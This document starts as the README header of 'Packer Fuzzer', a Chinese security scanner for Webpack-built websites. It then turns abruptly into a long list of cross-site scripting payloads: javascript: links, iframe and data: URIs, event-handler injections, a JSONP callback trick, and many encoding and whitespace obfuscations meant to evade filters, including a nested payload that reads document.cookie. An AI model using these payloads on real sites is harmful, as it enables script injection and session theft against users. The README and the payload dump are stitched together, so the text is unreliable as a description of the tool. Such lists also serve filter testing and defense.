<h1 align="center" >Packer Fuzzer</h1>

<h3 align="center" >一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具</h3>

 <p align="center">
    <a href="https://github.com/rtcatc/Packer-Fuzzer"><img alt="Packer-Fuzzer" src="https://img.shields.io/badge/python-3.X-blueviolet"></a>
    <a href="https://github.com/rtcatc/Packer-Fuzzer"><img alt="Packer-Fuzzer" src="https://img.shields.io/badge/Version-1.4-red"></a>
    <a href="https://github.com/rtcatc/Packer-Fuzzer"><img alt="Packer-Fuzzer" src="https://img.shields.io/badge/LICENSE-GPL-ff69b4"></a>
    <a href="https://github.com/rtcatc/Packer-Fuzzer"><img alt="Packer-Fuzzer" src="https://img.shields.io/github/stars/rtcatc/Packer-Fuzzer.svg"></a>
    <a href="https://github.com/rtcatc/Packer-Fuzzer"><img alt="Packer-Fuzzer" src="https://img.shields.io/badge/Packer-Fuzzer-green"></a>
    <h5 align="center">由Poc-Sir、KpLi0rn、Liucy、RachesseHS、Lupin-III荣誉出品</h5>
    <h5 align="center" ><a href="doc/kiwi/README.en.md">Click here for the English version</a></h5>
 </p>

<a href="javascript:alert(9)" >aaa</a>
 <p align="center">
    <img src="doc/kiwi/demo-terminal.png" alt="DEMO" width="77%" height="77%">
   <img src="xx" onerror=alert(9) />
 </p>
利用 JSONP 回调（需目标存在 JSONP 端点）
    <iframe src="https://api.example.com/jsonp?callback=alert(1)//"></iframe>

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
<iframe src="aaa" onmouseover=alert('xss') /><iframe>
<iframe src="javascript:alert(1)">test</iframe>
<iframe onload="alert('xss');"></iframe>
<iframe onmouseover="alert('xss');"></iframe>
javas%0a%0dcript:alert(1)
<iframe src="aaa" onmouseover=_=alert,_(9) /><iframe>

<iframe src=javasc&NewLine;ript&colon;alert(1)></iframe>
<iframe src=javas&#x09;cript:alert(1)></iframe> //Tab
<iframe src=javas&#x0A;cript:alert(1)></iframe> //回车
<iframe src=javas&#x0D;cript:alert(1)></iframe> //换行
<iframe src=javascript&#x003a;alert(1)></iframe> //编码冒号
   <iframe srcdoc="<svg onload=alert(1);>">

<iframe src=javascript:['xss'].find(alert) />
<iframe src=javascript:alert("xss")></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%22%78%73%73%22%29"></iframe>


<iframe data-v-78b5eb71="" src="javascript:import('data:text/javascript,new Proxy({}, { get: (_, prop) => prop === \'exec\' && alert(1) }).exec')" id="setWatchPreview_iframe"></iframe>


<html>
    <iframe id="myIframe"></iframe>  
    <script>  
        // 使用 JavaScript 动态设置iframe的src  
        document.getElementById('myIframe').src = 'data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E';  
    </script>  
</html>

反复编码
<iframe src="data:text/html,%3Ciframe%20src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPGlmcmFtZSBzcmM9ImRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENoa2IyTjFiV1Z1ZEM1amIyOXJhV1VwUEM5elkzSnBjSFErIj4%3D%22%3E">

<a/+/onmousedown=alert(9)>ass</a>
<a href="javascript:alert('test')">link</a>
<a href="java&#115;cript:alert('xss')">link</a>
<a href=javascript:alert(&quot;XSS&quot;)>link</a>
<a href=`javascript:alert("RSnake says,'XSS'")`>link</a>
<a href=javascript:alert(String.fromCharCode(88,83,83))>link</a>
<a href="javascript&colon;alert(1)">link</a>
<a href="javasc&NewLine;ript&colon;alert(1)">link</a> 
<a href="javas&Tab;cript:\u0061lert(1);">Hello</a>
<a href="jav	ascript:alert('XSS')">link</a> //tab键
<a href="jav&#x09;ascript:alert('XSS')">link</a>
<a href="jav&#x0D;ascript:alert('XSS')">link</a>
<a href="jav&#x0A;ascript:alert('XSS')">link</a>
<a href=" &#14;  javascript:alert('XSS');">link</a>
<a href=" &#14;  jav	ascript:alert('XSS');">link</a>//tab键
<a href="&#14; jav	as	cript:\u0061	\u006C\u0065\u0072	\u0074(1)	">link</a>
<a href="javascript:\u0061lert&#x28;1&#x29">Hello</a>
<a href="javascript:confirm`1`">link</a>
<a href="javascript:confirm(1)">link</a>
<a href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">1</a>
<a href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:al		er	t(1)">1</a>//tab键
<a href="&Tab;javascript:alert(9)">1</a>
<a/href="&Tab;javascript:alert(9)">1</a>
<a href="javascript:%61%6c%65%72%74%28%31%29">link</a>
<a href="javascript:\u0061\u006C\u0065\u0072\u0074(1)">link</a>
<a href="jav	as	cript:\u0061	\u006C\u0065\u0072	\u0074(1)	">link</a>
<a href=javascript:eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")>2</a>
<a href=javascript:eval("&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;")>link</a>  

